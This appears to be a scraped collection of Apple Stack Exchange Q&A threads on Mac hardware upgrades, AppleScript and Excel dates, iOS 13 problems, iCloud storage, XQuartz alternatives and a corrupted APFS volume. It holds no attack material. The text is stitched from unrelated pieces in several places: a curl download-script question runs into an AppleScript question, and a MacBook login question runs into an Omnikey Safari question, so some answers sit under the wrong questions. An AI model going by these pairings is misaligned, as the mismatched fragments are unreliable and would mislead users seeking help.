your system's Apple support page, although they may be lower than the factual, since Apple may not update support pages when, for example, a firmware update adds support for a faster interface that was not supported by the original.\n2) Max out your RAM. Again, the supported RAM amount may be available on your system's Apple System's support page, although it may be lower than the factual, since Apple is known to me to not update these when for example a larger single RAM unit becomes available than at inception. For example a 2010 Mac Mini supports 16 GB of RAM (2 x 8 GB), while according to the Apple support page it only supports 8 GB total. I would suggest you research this further on user forums for your system.\nApple systems, other than notebooks, tend to be sold with a big upgrade-ability. So if you max out the above two factors, you may increase the responsiveness of your system from crawl to excellent easily. (e.g.: RAM 2 GB -> 16 GB + SATA HDD -> SATA 2 SSD = 2nd life) \n(For the few Apple systems that allow GPU upgrades, proceed similar to item 1) above)\n", "Q: How to create recursive download and rename bash script I need to make a bash script that will download a image with curl and then rename the file, wait 5 mins and then re-download the file and rename it again so that the new file does not replace the old file.

The basic purpose of the script I've been working on is to read information from Excel files and put it into a FileMaker Pro database. Everything is working well so far, except when attempting to get the value of cells containing dates. Since the dates in the Excel file are already formatted correctly (mm/dd/yy) for the database they are to be put in, I would like to simply read and write them as strings. \nThe problem arises here, where AppleScript outputs the values as dates in the format (day of the week, month dd, yyyy at 12:00:00 AM) despite my attempt to read them as strings. Below is a shortened version of the script that shows where the problem is occurring.\n    tell application \"Finder\"\n    activate application \"Microsoft Excel\"\n    open the first file in folder \"Macintosh HD⁩:⁨Users:⁨theUser⁩:Documents⁩:⁨attachments test\"\n    tell application \"Microsoft Excel\"\n        tell active sheet\n            tell used range\n                set rowCount to count of rows\n\n                repeat with i from 2 to rowCount\n\n                    set colA to \"A\" & i & \":A\" & i\n                    set theDate to get value of range colA as string\n\n                    set rowB to \"B\" & i & \":B\" & i\n                    set theTime to get value of range rowB as real\n\n                    set colC to \"C\" & i & \":C\" & i\n                    set serialNo to get value of range colC as integer\n\n                    set colD to \"D\" & i & \":D\" & i\n                    set pH to get value of range colD as real\n\n                    set colE to \"E\" & i & \":E\" & i\n                    set theVolume to get value of range colE as real\n\n\n                    display dialog \"The serial number of row \" & i & \" is: \" & serialNo & \" and the pH value is: \" & pH & \" and the volume is: \" & theVolume & \" and the date is: \" & theDate & \" and the time is: \" & theTime\n\n\n\n                end repeat\n\n            end tell\n        end tell\n    end tell\nend tell\n\nI also tried another method to deal with the problem by setting a variable each for day, month, and year, but ran into another issue where month is not recognized as a purple word (whatever that should be called) and is instead blue (again, I cannot find what these terms are called anywhere). In the image below are three different ways I attempted to get these values from the date in format (day of the week, month dd, yyyy at 12:00:00 AM) so that they could then be reorganized manually.\n\nMy only guess for the initial problem is that 'as string' does not work when placed after the other parts of the line, but I have no clue why month is refusing to cooperate. Any guidance would be greatly appreciated!\n\nA: This may not be a direct solution or quite the answer you are looking for, but this following AppleScript code provide examples of how to convert a given short date string into an actual date, how to extract the elements of the date, edit and set date and time values, and to create your own custom date and time as a string.  Hope this helps.\nset dateAsText to \"9/23/16\"\n\n-- converts dateAsText into an actual date\nset someDate to date dateAsText -- date \"Friday, September 23, 2016 at 12:00 AM\"\n\n-- extract the short date from someDate... as a string\nset shortDate to short date string of someDate -- \"09/23/16\"\n\n-- change the time value of someDate from \"12:00 AM\" to \"5:00 PM\"\nset adjustedDate to date \"5:00 PM\" of someDate -- date \"Friday, September 23, 2016 at 5:00 PM\"\n\n\n-- extract elements from adjustedDate... as strings\nset theTime to time string of adjustedDate -- \"5:00 PM\"\n\nset theWeekday to weekday of adjustedDate -- Friday\nset theWeekday to (weekday of adjustedDate) as string -- \"Friday\"\n\nset theDay to day of adjustedDate -- 23\nset theDay to (day of adjustedDate) as string -- \"23\"\n\nset theMonth to month of adjustedDate -- September\nset theMonth to (month of adjustedDate) as string -- \"September\"\n\n-- edit values of adjustedDate\nset day of adjustedDate to 14 -- date \"Wednesday, September 14, 2016 at 5:00 PM\"\nset year of adjustedDate to 1978 -- date \"Thursday, September 14, 1978 at 5:00 PM\"\n\n------------\nset customDate to short date string of adjustedDate & space & theTime -- \"09/14/78 5:00 PM\"\n\n\nA: It seems string value (not value) is the term you're looking for. Excel stores cells in its raw format (e.g., date, number, etc.) but then has the separate ability to format those values. So, for example, you could store the number 2.33423 but display it as 2.3 showing just one decimal.\nIn Applescript, this is the difference between the term value (which is the raw value the way Excel stored it) and string value which is the way Excel displays it.\ntell application \"Microsoft Excel\"\n    get value of active cell\n    -- date \"Sunday, May 19, 2019 at 12:00:00 AM\"\n\n    get string value of active cell\n    -- \"5/19/19\"\nend tell\n\nNow, provided you have already set the target formatting on the cell, you can set the cell contents simply, by something like this:\ntell application \"Microsoft Excel\"\n    set value of active cell to \"6/18/2019\"\nend tell\n\nProvided this cell is formatted as a date, it will interpreted as such.\nGetting back to the original issue at hand, you can review AppleScript's class definitions for the class date -- scroll down until you find the entire description. The reason that month appears differently, is that it is a constant not an integer. Date is a class type inside AppleScript, which has associated properties you can get or manipulate.\nFor example:\nOne could get the month as an integer in the following way (otherwise, it will be a constant).\ntell application \"Microsoft Excel\"\n    set theDate to value of active cell as date\n    get (month of theDate) as integer\nend tell\n\nAdditional references:\n\n\n*\n\n*Excellent discussion on AppleScript time and date formatting.\n\n*Additional sample code on setting the date on an Excel cell. I'm not sure this is needed, but it shows you how you can do it.\n\n\nA: Take the date that Excel is currently giving you and coerce it back into the format you need to put into Filemaker like this:\n    tell theDate to set dateList to {its month as integer as text, day as text, year as text}\nset {saveTID, AppleScript's text item delimiters} to {AppleScript's text item delimiters, {\"/\"}}\nset newDate to dateList as string\nset AppleScript's text item delimiters to saveTID\n\n", "Q: Is there any way to develop iOS apps on a MacPro 2,1 in 2019? I wanted to run cordova on some my apps so that I can test them for iOS. Running cordova run ios on a windows system will complain:\n\nxcodebuild was not found. Please install version 9.0.0 or greater from\n  App Store\n\nI had already read that you needed a Mac in order to build iOS apps so not knowing much about Apple computers I bought an old Mac Pro for $100 thinking it would work.\nI later learned this Mac Pro is running Mac OS 10.6.8 and that it cannot be upgraded further. There's a Mojave patch that works on MacPro 3,1 and later won't work on MacPro 2,1 The xcode in the App Store requires Mojave, which I think is 10.14.xx\nIs there any work around to build these apps on this old MacPro 2,1 running 10.6.8?\n\nA: \nIs there any way to develop iOS apps on a MacPro 2,1 in 2019?\n\nNo. I'm afraid you've bought yourself a boat anchor. Developing iOS applications requires you to run a current version of XCode, which in turn requires a current version of macOS.\nThe MacPro2,1 was produced between mid-2007 and early 2008; the processor in this machine does not support some instructions which are used in current versions of macOS. There is no known way of working around this, and hobbyist projects to enable the use of macOS on unsupported hardware have abandoned all attempts to provide support.\n\nA: The Mac in question does not support a new enough macOS to install the latest versions of Xcode required to build an app that can on the App Store.\nHowever, you could use an online build service in order to be able to develop and test apps on this Mac. For example you could use your Cordova project with Monaca - they have a free plan where you can do 2 builds a day for free. Similarly you can use your Cordova project with the Adobe PhoneGap service - although not for free.\n", "Q: Upgrade iCloud storage from 50gb to 200gb then downgrade? I currently pay for the 50 GB iCloud plan for myself. I'm thinking of upgrade to 200 GB and share it with my wife using the family sharing. \nBut I was wondering what would happen if we use over 50gb together, and then eventually decide to stop using family sharing, and I go back to using my personal 50gb by myself. Will I no longer have space due to her files being used in it?\nFor instance: currently I'm using 30/50gb on iCloud. Let's say we switch to 200gb and use the family plan: I'm using 30/200gb and my wife is using 50/200gb. So total used would be 80/200gb. Then, if I turn off family sharing, and go back to the 50gb plan for my personal use, will I no longer have 20gb left? \n\nA: The short answer is: YES, you can do what you're proposing and you'll still have the same amount of space left. You're essentially asking - if I 1) sign up for family sharing, and; 2) upgrade my storage to 200 GB, can I reverse this entire process and everything will be the way I left it.\nThe answer is YES provided that your storage amounts and your wife's storage amounts are unchanged in your example.\nI think there is some confusion on how Family Sharing works. It does not merge your files... it doesn't actually insert your wife's files into your iCloud. It keeps them completely separate. You'll be able to see how much space her files take up by clicking on Manage Storage, but that's it - you won't have direct access to any of her files.\nSo, it will be a bar graph that will show something like this:\n\n\n*\n\n*Photos - 20 GB\n\n*Documents - 10 GB\n\n*Wife's files (family sharing) - 40 GB\n\n\n\nYou won't be able to see your wife's individual breakdown of how her storage is used -- e.g., docs, photos, etc., just that she is using 40 GB (and she won't be able to see your breakdown either).\nIf you decide to disconnect Family Sharing, it will simply remove the '40 GB' block of your Wife's files from your account and you will both have to sign up again for paid storage in order to keep your files. But, you'll still have 30 GB in this case, and she'd still have 40 GB, and you'd each be fine with a 50 GB plan.\nAs mentioned by @Udhy, in order to downgrade, you must be under the allowable storage limit. So in this case, if you were using Family Sharing, you would need to pay for the 200 GB plan as the 50 GB plan is not sufficient for both you and your wife to use. And, once you downgrade, you'd each be fine with the 50 GB plan.\n\nA: When you downgrade your iCloud storage plan, the storage decrease takes effect after your current monthly or annual subscription ends.\nIf you downgrade or cancel your plan and your stored iCloud content exceeds your available storage, new photos and videos don’t upload to iCloud Photos, files don't upload in iCloud Drive, Messages in iCloud don't update, and your iOS devices don't back up. \n", "Q: Can not login to MacBook Pro... strange boot screen Problem: My 2015 retina MacBook Pro is currently stuck booting up to this screen.

Omnikey is a very useful Safari extension that allows searching user-selected webpages by entering user-selectable keys preceding the search term. For example, entering \"w Los Angeles\" in the Safari address bar on my computer and pressing return opens a new Safari window in Wikipedia that's searching for \"Los Angeles.\" This is both easier and faster than navigating to the page you wish to search, entering the search term, then hitting return.\nHere's a screenshot of the searches I've added to Safari on my Macs:\n\nUnfortunately, Omnikey doesn't work with Safari 13.\nOmnikey is very useful. Are there any other Safari extensions that provide the same functionality?\n\nA: I was totally bugged out by the lack of Omnikey after upgrading to Safari 13.\nThis applescript saved my life (it's not mine so I'm just posting the link):\nhttps://macscripter.net/viewtopic.php?id=47107\nIn order to activate it, open Automator, create a new Quick Action, select \"Run Applescript\" from the action list on the left side of the window, and copy/paste the script to the editor window. Above the editor window, change \"Workflow receives\" to \"no input\" and save.\nThen go to System Preferences, keyboard, shortcuts, and assign a keyboard shortcut to it. Now, when in Safari's address bar you can just press the shortcut and the script transforms the search to the right URL, e.g. type \"we apple\", press the shortcut, services, and the wikipedia article about \"Apple\" opens in the same Safari tab.\nIn order to add more searches, just edit the script in the \"property shortcuts\" section, it looks pretty self-explanatory to me. Now searching from the address bar works almost as before, just have to get used to pressing the shortcut instead of return.\n\nA: I was missing this very same functionality. In response, I created a small extension for Safari 14, replacing this functionality: Smart Keyword Search.\n(I did today also stumble upon another extension claiming to do the same: Search Key -- I do feel that Smart Keyword Search allows for more options, and has better documentation, but I cannot be considered objective I guess :)).\n\nA: As OP informed, restarting after reverting using backup restore made Safari accept the Omnikey as an extension. They are on Safari 12.1.2.\nThe post below may concern those looking for more ways to achieve the same. \n\n\n\n*\n\n*Omnikey can be used in the browser by fooling the browser (Safari 12.1.1) into believing that you're developing the extension(that's what I can make of it).\n\n\n*\n\n*Load it using Show extension builder in Develop menu in the form of an folder which you can get by expanding the .xar version of the extension file which you can get from the site.

The problem is that I cannot update my iPhone 6 to iOS 13, so does that mean I won't be able to update my watch until I buy a newer version of iPhone?\n\nA: The message you're getting is the same message all users will get until they upgrade their paired iPhones to iOS 13. In other words, you're not just getting this because your iPhone isn't capable of running iOS 13.\nUnfortunately, if you're really wanting to take advantage of any of the new features in watchOS 6, you'll need to pair it to an iPhone running iOS 13 before you can upgrade watchOS.

I have an iPhone SE so does my cousin. A few days ago we went to the movies and I noticed she was 3D Touching her way around the screen. \nThis surprised me because I don't think my iPhone SE has ever had 3D Touch capability, so when I got home I looked in the settings app but there was no 3D Touch option anywhere.

What you most likely witnessed is that your cousin was running the iOS 13 Beta and as a result of this, Haptic Touch is now available on some older iPhones that never had 3D Touch.\nIn terms of what you can do about it, you’re in luck because iOS 13 is now available to the public. All you need to do is upgrade iOS and you’ll have the Haptic Touch support that iOS 13 offers (one that is almost identical to 3D Touch). \nThat is, in iOS 13 Haptic Touch is now available in most of the ways that 3D Touch was available to 3D Touch devices (previously, in iOS 12 Haptic Touch was limited). However, the way to utilise it is by pressing on the screen continuously for a second or so, as opposed to applying more pressure in the way 3D Touch worked. Because this works on the basis of how long you're pressing, there's no need for special hardware, hence the reason why the iPhone SE can take advantage of this feature.\nFor more information, see the iOS 13 info on Apple's website.\nTo upgrade, simply go to Settings > General > Software Update.\n", "Q: US marketed iPad Pro warranty in India If I buy an iPad Pro in the US does it have a 1 year Apple warranty in India?\n\nA: Apple products have International warranties but only in the countries where it has, it's own Stores. In India, there are no Apple-owned stores yet. They are Resellers authorized by Apple but they won't service your device because you won't possibly be taking it to Apple-owned stores. I hope this suffices your query.\nhttps://www.apple.com/legal/warranty/products/ipad-english-a.html\n", "Q: Using the iPad Pro with Apple digital AV Adapter and headphone jack adapter I am using the digital AV USB-C to connect my iPad to an external display via HDMI. \nNow I want to connect external speakers via a headphone jack. \nI plugged the AV adapter into the iPad, plugged HDMI into the adapter and plugged the headphone jack in the AV adapter using the USB-C headphone jack adapter from apple. (I used the USB-C Port of the AV adapter). \nThe iPad does not recognize the external speakers, and the audio is coming out of the iPad speakers. I cannot change this in the control center. \nIs the AV Adapter capable of routing audio to its USB-C port?\nOr am I missing something?\n\nA: The USB-C port on the Digital AV Multiport adapter is for charging only. It doesn't carry any data at all - and therefore also not sound.\n", "Q: How does \"Find My\" application is working with location service changes in iOS 13 I have installed iOS 13 and gave it a shot to Find My application. First question is the location service and I have chosen \"While Using App\". But what does that really mean? Does it mean that I have to have Find My application running all the time so people can see where I am. I am a bit confused.\n\nA: The While Using App permission means it's using your location when actively running (foreground) or in the background.\nYou can keep 'Find My' app in the background (do not force-quit) and it will be able to access your location.\nUpdate: Source:\nThe Always Allow option, which grants an app “background” location access, has been removed from the initial location permissions prompt. \nInstead, users can select Keep Only While Using (aka “foreground” permission) or select a new option, Allow Once. \nSo how does an app then get upgraded to “background” location permission? If the user continues to use the app, iOS 13 will now automatically and periodically prompt to upgrade location permissions from While Using to Always Allow.\n", "Q: Does an iOS app with Sign In with Apple ID work on iOS 12? I want to know whether an iOS app with Sign In with Apple ID runs on iOS 12 or not.\n\nA: Whether an app supporting Sign In with Apple ID will run on iOS 12 or not will depend on how the developers configured it. When building an iOS app, you have to indicate a minimum supported iOS version. Since not everybody will run the latest iOS version, they'll probably specify a lower target, e.g. iOS 10 or 11.\nThat's not the only thing they need to do; before they call the \"Sign In with Apple ID\" API, they have to check the current iOS version. If it's older than iOS 13, the API call should be skipped since it's likely to crash the app (the App Store reviewers might even reject it for that reason).\nSo all in all, it will likely run on iOS 12 as well, but without the feature.\n", "Q: Is it possible to migrate iPhone to blocked iPhone? I have an old iPhone with broken glass and some other issues.\nMy company sometimes has iPhones left by previous employees. Those bound to apple id and no one knows login and password to it. They say it is impossible to unlock it. I wonder if it possible to take blocked one and swap some hardware with my phone so that all the data from my iPhone would migrate to \"blocked\" one and it will be unblocked? \n\nA: No, it is not practically possible to exchange or reuse hardware in that manner to avoid the Activation Lock. It might be possible for some very skilled, well-equipped techs at Apple - but for the rest of us - no.\nYour company can however contact Apple and get the locked phones unlocked as they should have receipts, etc. on their books to prove ownership.\n", "Q: How to migrate from Android 5.1 to iPhone 8? Is it possible and how to move all info, contacts, images, photos, mp4 files from android 5.1 to iPhone?\n\nA: Generally speaking, yes.\nI imagine there is a minimum OS version on both Android and iOS but there is an officially supported (by Apple) method which they detail here. There is also an app \"Move to iOS\", that goes on the Android phone available in Google Play.\n", "Q: Upgrade to iOS 13 gets stuck at the Apple logo and the horizontal progress bar I restarted the iPhone, plugged in the lightning to supply the power, and started the upgrade from iOS 12.4 (I think it was) to 13.\nIt is stuck at the Apple logo screen with the horizontal bar, with the bar showing what is like 99%, and it has been like that for 1.5 hours now. What can be done?\nP.S. To see what might be able to fix it. Please see my answer for the possibilities. Unfortunately, I waited for iOS 13.1, 13.1.1, and 13.1.2, and none could fix it.\n\nA: You may want to read If you can't update or restore your iPhone, iPad, or iPod touch on Apple's website. Essentially, You have two main options.\n1. Force restart your iPhone\nIn other words, force your iPhone to reboot. How you do this will depend on your model of iPhone. Since you haven't specified this, refer to Force restart iPhone on Apple's website.\n2. Put your iPhone into Recovery Mode\nIf you have an iPhone 8 or X follow these steps:\n\n\n*\n\n*Connect your iPhone to a computer with a Lightning cable \n\n*Open iTunes on the computer\n\n*Press then release the volume up button on your iPhone\n\n*Immediately press then release the volume down button on your iPhone \n\n*Hold the side button, and keep holding it down till you see the Recovery Mode\nscreen (this appears after the Apple logo\n\n\nIf you have an iPhone 7 follow these steps:\n\n\n*\n\n*Connect your iPhone to a computer with a Lightning cable \n\n*Open iTunes on the computer\n\n*Press and hold both the side button and volume down button on your iPhone\n\n*Keep holding them down till you see the Recovery Mode screen (this appears after the Apple logo)\n\n\nIf you have an iPhone 6S follow these steps:\n\n\n*\n\n*Connect your iPhone to a computer with a Lightning cable \n\n*Open iTunes on the computer\n\n*Press and hold both the Home and Lock button\n\n*Keep holding them down till you see the Recovery Mode screen (this appears after the Apple logo)\n\n\nA: First Attempt:\nFollowing Monomeeth's answer, I pressed the Sleep / Wake button together with Volume down and the iPhone restarted, and the horizontal bar moved back 20% and worked its way up to 99% and stopped there for another hour. And I repeated this 2 times already and it was doing the same thing.\nSecond Attempt:\nAnd then, I went to an Apple Store, and was told that I can try 2 things.\nUse a Mac to connect to the iPhone and use Recovery Mode, and try \n\n\n*\n\n*to upgrade it from the computer and hope to keep the data on the phone,  \n\n*restore it to factory setting, and lose all data on the iPhone.  \n\n\nSo we tried (1) and it is the same result of 1% till finish and it got stuck.  So it looks like I have to lose all data. \nBut there is a third choice: use an old iPhone first, and wait for iOS 13.0.1 or iOS 13.1, and see if the upgrade using the Mac can successfully handle it.  My Photo Album on the iPhone was corrupt one time and the iPhone rebuilt the albums. I wonder if the upgrade to iOS 13 is related to this issue (the upgrade cannot handle the photos to rebuild the index for iOS 13, and it could not go on).\nThird attempt:\nI waited for iOS 13.1 and went into iPhone Upgrade from Macbook, and the weird thing is, the Macbook was downloading iOS 13.1, and after about 15 minutes, the download wasn't finished yet, but the iPhone went onto upgrade itself using iOS 13.0.\nSo I had to wait for the download to complete, and then go again into iPhone Upgrade for iOS 13.1. \nAnd it didn't fix the problem.  The upgrade again stopped at about 99% of the grey horizontal bar.\nAnd then, I waited for iOS 13.1.1, and repeated. And it failed.\nAnd then, I waited for iOS 13.1.2, and repeated. And it failed.\nSo I finally \"restored\" it to the latest iOS, which is 13.1.2, and it could restore and boot up this time.  But I had to download everything and sign in again and set up everything.\nI wasted about 8 hours total and lost almost all info on the iPhone. Sure, I should have backed up the iPhone regularly, but I wouldn't expect an iOS upgrade cause my phone not able to even boot up, and let me try and try again, with the final way to restore it to \"factory\".\n", "Q: Safari 13 update sets negative com.apple.quarantine -1 making multiple directories inaccessible Updated to Safari 13 today on Mojave 10.14.6 and suddenly a bunch of my ~/Library/ directories are inaccessible via terminal and other apps (even with sudo).  Checking the xattr I see:\ncom.apple.quarantine -1\n\nDirectories affected:\n~/Library/Calendars (previously 28)\n~/Library/Cookies (previously 15)\n~/Library/Mail (previously 19)\n~/Library/Safari (previously 15)\n\nTwo other changes in ~/Library/ I found are with:\ncom.apple.metadata:com_apple_backup_excludeItem -1\n\nDirectories affected:\n~/Library/PersonalizationPortrait (previously 61)\n~/Library/Saved Application State (previously 61)\n\nNow I can't access these directories via terminal or some other apps.  Interestingly I can navigate to the directory with Finder.  e.g. Navigate to ~/Library/Safari/Extensions/  But when I click on Extensions.plist, Xcode does not have permission to open it.\nI can't seem to find documentation on what the negative values mean and how to change it because sudo doesn't even have permission to change it.\nSomething more weird is my High Sierra machine doesn't have these com.apple.quarantine changes.\nUpdate:  It's very possible that multiple directories outside ~/Library/ are also affected because my next Time Machine backup was over 1 GB and the only thing that changed is the install of Safari 13.\nUpdate 2: My High Sierra machine's next Time Machine was over 11 GB after this one Safari 13 install.  Something weird is definitely happening with this update.\n\nA: Ok, after wasting lots of time chasing this issue, I found one possible solution but it has raised more questions.\nIf I give Terminal Full Disk Access, the quarantine value shows the original values.  Which means either the Safari 13 update also contains Gatekeeper system updates or Apple pushed an independent silent Gatekeeper data update around the same time.\nMore questions:\n\n\n*\n\n*Why was this working fine before?  Terminal never had Full Disk Access permission.\n\n*Note that Xcode still doesn't have permissions.  That means I need to give Xcode Full Disk Access too.\n\n*Why the huge difference in Time Machine backups post update?\n\n", "Q: Reveal all favourites in new tab page on macOS Safari MacOS Safari just updated itself to 13.0\nNow when I open a new tab it shows me only two rows from my favourites.\nView > Show favourites bar... shows me all of my favourites.\nHow do I get the new tab page to show me a grid of all of my favourites, as it did before the update?\n\nA: There was a \"Show more\" button at the top-right:\n\nBut I couldn't see it in full-screen Safari because I have View > Always Show Toolbar in Fullscreen unchecked:\n\nThe slide-out toolbar was covering up the title and \"show more\" button on the page.\nThere are multiple ways to reveal them:\n\n\n*\n\n*Open a Safari window that isn't full-screened\n\n*In the new tab page, drag one of the favicons and then put it back in the same spot.

First step Data Recovery. Low class data recovery doesn’t recovery everything and can scramble some files making decrypting the files very difficult. Nearly impossible without the recovery key. If the recovery key is known it’s, possible. This is very time and resource consuming and very difficult to target specific data. However If an organization wants to spend an astronomical amount of money to extract and decrypt data they pretty much can unless you destroy the disk. Zeroing out a drive makes it harder for the data to be recovered but takes a very long time and puts a lot of ware and tear on the disk.  \n", "Q: MacBook Pro new battery not charging. Defective? Model: MacBook Pro 13\" Retina early 2015\nMy MacBook Pro had a battery in the condition \"Replace now\" so I bought a new battery on ebay and got it replaced.

Now that iOS 13 is out, and iPhone 5S and iPhone 6 won't be getting it - does this mean that the phones are no longer supported?\nShould these devices be considered past their end-of-life? I know that Apple released a iOS 12 security update alongside iOS13, but will that continue to happen?\nIs there a way to find out the security status of each iOS/iPhone release?\n\nA: There's a difference between hardware support (new battery, replacement screen, etc) and software support.\nTypically, Apple provides hardware support for 5 years after manufacture on their products. \nThe iPhone 5S is not currently listed as 'vintage'. However, it's possible the list may be updated shortly, as the phone was discontinued 5 years ago.\nThe iPhone 6 was discontinued 2 years ago, so will still receive hardware support until 2022.\nAs for software support: obviously, the devices will not be offered new OS updates, but in the event of a major security flaw, they may receive a patch to fix the problem.\nThe phones will of course continue to work as they are. Apps will not be updated if they require newer OS versions than are present.\n\nA: \niOS 10 was officially released on September 13, 2016.\niOS 10.3.3 was released on July 19, 2017.\niOS 10.3.4 was released on July 22, 2019 \niOS 11 was officially released on September 19, 2017.\niOS 11.4.1 was released on July 9, 2018.\n[iOS] 12.0 was [released] on September 17, 2018. \niOS 12.4.1 was released on August 26, 2019\n\nSo we can't tell what Apple does or what it will do, but iOS 10.3.4 was released after iOS 11 launch.

I just received a new 15 inch macbook pro (2019). I connected it to my external monitor LG 38WK95C-W via the monitor's provided USB-C cable.\nIt does video/data transfer however since it is a usb-c cable it is also charging my MacBook. I did some research and these are the specs for both my LG monitor and my MacBook:\n\n\n*\n\n*MacBook (15 inch): Battery and Power = 87W USB-C Power Adapter\n\n*LG Monitor: POWER: Output 60W >> throughout its USB-C output.\nThere is no feature to disable power via USB-C cable, under the circumstances will my LG monitor damage MacBook's battery since it provides less Watts (60 W) than MacBook's charger (87 W)?\nAlso any tips / workarounds to have the USB-C connection only transfer video without providing power?\nThank you for any assistance.\n\nA: I'm assuming the main concern you have is that charging from the LG 38WK95C-W display is going to damage your MacBook Pro in some way. \nThis is not something you need to worry about. Having a charging source that provides 60W is really akin to using one of the chargers that ship with the 13\" versions of the MacBook Pro on a 15\" MacBook Pro. The net result is that your MBP will charge slower than it would with the higher watt charger, but this will not cause any damage to the MacBook Pro.\nIf you're concerned about this (and you really shouldn't be) you can change the cabling you're using to connect to the display so that you're using one of the display's other ports (e.g. it has HDMI) and totally bypass the USB-C port so that power pass-through doesn't occur. Of course, to do this you'll need a USB-C > HDMI adapter.\n", "Q: Add a Google account to macOS 10.14.6 running Safari 13.0? Starting on September 20, 2019, my macOS 10.14.6-equipped iMac began asking me to enter the password for two Google accounts I've long had connected to the machine.\nI clicked the notification bubble and it took me to the Internet Accounts area of System Preferences. Upon clicking one of the two Google accounts a dialog was presented by System Preferences that informed me I had to complete password entry for the Google account in Safari. Clicking OK opened Safari but no authorization page is every loaded.\nI deleted the accounts and attempted to re-add them to the Internet Accounts settings but the problem remains. I'm stuck in a loop.\nPrior to this occuring, I updated Safari on the iMac.

Is it possible to put the hard drive of the macbook into the mac pro if not what can i do \n\nA: Sure you can - it will even boot from it if you ask it to by holding Opt at the chimes.\nYour only issue may be to get it to physically fit the drive sled in the Pro. For that just get a physical adaptor so that the connectors line up properly.\nOWC are well-known for their Mac-compatible products - selection of their drive adaptors. Make sure the one you get is for a 2012 Mac. I'm not certain if the adaptors need to be different [they probably don't, you just need a 2.5\" to 3.5\" adaptor, cheapest, first in the list] but I do know that the earlier Mac Pros had very very slightly different sled designs. Really hard to tell by eye, but they are not swappable.\nI have two early Pros & two late Pros… & the number of times I've tried to use the wrong sled… D'oh!\nI have one of their adaptors on a 3,1 but I've never actually tried it in a 5,1.

XQuartz was always the goto for running X applications on a MacOS desktop. It's been a couple of years since the last version of Quartz and there is no activity on the github, so we may assume that the XQuartz project is dead.\nAre there any alternatives for running X application on a MacOS desktop?\n\nA: \"... there is no activity on the github, so we may assume that the XQuartz project is dead.\"\nReports of the death of Xquartz would appear to be greatly exaggerated: someone has been working on a 2.8.0 release since the start of the year, and there is now a 2.8.0 beta, as a Universal Binary!\nhttps://www.xquartz.org/releases/index.html\nand a mail message from the maintainer Jeremy Huddleston Sequoia https://www.mail-archive.com/xquartz-dev@lists.macosforge.org/msg01027.html\n\nThis release is built with a brand new build system (cf\nhttps://github.com/xquartz/xquartz) based on MacPorts + git submodules + our\nshell script.  Older builds required either a lot of hand-holding or Apple\nInternal tools, so this will hopefully be a step towards making it easier for\nothers to drive future releases of XQuartz.\n\n\nA: You can use MacPorts. X11 from MacPorts are newer than others.\nQuote from FAQ for MacPorts\n\nMacPorts does not use the X11 client libraries provided by the system and installs its own copy. This allows for more consistent support for older machines which are not as up to date (especially Tiger which doesn't have a pkg-config compatible X11 SDK). Most X11 packages in MacPorts are newer than those shipped by Apple and usually reflect the latest work from the ​XQuartz Project.\n\ne.g. xorg-server from MacPorts\n\nA: The Macports version of xorg-server works on Apple Silicon (M1) and  replaces Quartz perfectly for me. I can run xterm's and also emacs in x11 mode.  The main change I had to make over Quartz was being sure not to set the DISPLAY variable, which can happen in a number of places in the launch or start-up scripts, in my case it was in .bash_profile.\n\nA: There are really no strictly better alternatives.\nXQuartz is usually the best option for running an X server on a Mac.\nIf you're running older OS X versions, you might prefer X11.app from Apple.\nIf you're using older Mac hardware with PowerPC CPUs, you can also run XFree86 in the Darwin/PowerPC port (note that Xorg.org is originally a forked XFree86).\nIf you simply looking for alternatives - you could also take a look at WeirdX. It is old, it is slow and doesn't have as many features as Xorg - but it is an alternative:\nhttp://www.jcraft.com/weirdx/\nBesides that - there's always the option of running for example Linux in a virtual machine on your Mac, and then run your X server in there (for example Xorg).\nAlso you could look at alternative ways of connecting to your Linux desktop. For example you could use Xpra:\nhttps://xpra.org\nThere's a macOS client - but there's also a HTML5 client for accessing the desktop through a browser.\nAnother alternative would be to use VNC instead of the X protocol.\nUPDATE January 2021: An XQuartz 2.8 beta has just been released with support for Apple Silicon!\n", "Q: Accessing unmountable APFS Volume on a disk image I have run into trouble with APFS. I have an external hard drive (spinning plates) with two partitions. Some time ago one of these partitions stopped being mounted. Neither Disk Utility nor running fsck could repair it. Disk Utility in recovery mode could not repair it. The partition is not encrypted. All of this is happening on macOS 10.14.6.\nI created an image from the entire external drive in hope that I would be able to access the data on the partition from there. This image, when mounted, correctly shows the uncorrupted partition, but the other partition is not mounted and greyed out in Disk Utility.\nMy investigation showed that the issue is the object map, which has come up a few times in my googling, but with no solutions.\nsudo fsck_apfs -l -n -S /dev/disk4s3\n\n** Checking the container superblock.\nwarning: checkpoint<->superblock disagree for xp 88\n** Checking the EFI jumpstart record.\n** Checking the space manager.\nwarning: spaceman chunk 916 free count 4294943744 > block count 32768\nwarning: spaceman main free count 351394375 does not match sum of free counts 351417927\n** Checking the space manager free queue trees.\n** Checking the object map.\n** Checking volume.\n** Checking the APFS volume superblock.\n** The volume Extras was formatted by newfs_apfs (748.57.19) and last modified by apfs_kext (945.220.38).\n** Checking the object map.\nerror: (oid 0x231dea) om: btn: invalid o_type (0x40000002)\n   Object map is invalid.\n** The volume /dev/disk4s3 could not be verified completely.\n\nI believe the data on the drive is fine, but the few blocks of corrupted APFS make the whole drive unusable.\nI know of boysoft data recovery software, but I am not interested in individual files or images etc. from this drive, I want the entire partition (I do wonder however, how is this software able to access files on unmountable drive). I know that had this been HFS system, DiskWarrior could probably rebuild the whole partition, but due to not-fully-documented nature of APFS (WTF Apple?), DiskWarrior people can't help...\nI would like to know if there is any way of accessing the data on the unmountable APFS Volume? Or maybe fixing the object map so that the drive can be mounted and browsed?\nAny tips would be greatly appreciated...\n\nA: Hopefully, you still have the disk image to work with!\nWhilst I cannot provide a complete solution immediately, I can at least provide some guidance. The output from fsck suggests that a node within the B-tree that represents the object map for your affected APFS volume is partially corrupted. Assuming that 0x40000002 in the line error: (oid 0x231dea) om: btn: invalid o_type (0x40000002) is the incorrect o_type value that appears in the affected block on disk, then this may be a relatively simple issue to fix; the value ought to be 0x40000003.* Of course, after fixing this, you may run into subsequent issues.\nIf 0x40000002 refers to the value that should appear on disk, then this means that the root node of your APFS volume's object map B-tree has become corrupted somehow, and further investigation is necessary.\nI recently developed a toolset for inspecting such issues. If possible, compile apfs-inspect and share the output of apfs-inspect disk.img, where disk.img is the disk image you made of the APFS container partition. Please use a PasteBin link or similar, as the output will be very long. I'll then be more than happy to provide further guidance.\n\n*The APFS spec published in February 2019 (PDF) explains that the o_type value of an APFS block represents the \"storage type\" and \"object type\" itself of the object that that block's data represents. The first 4 nibbles, i.e. 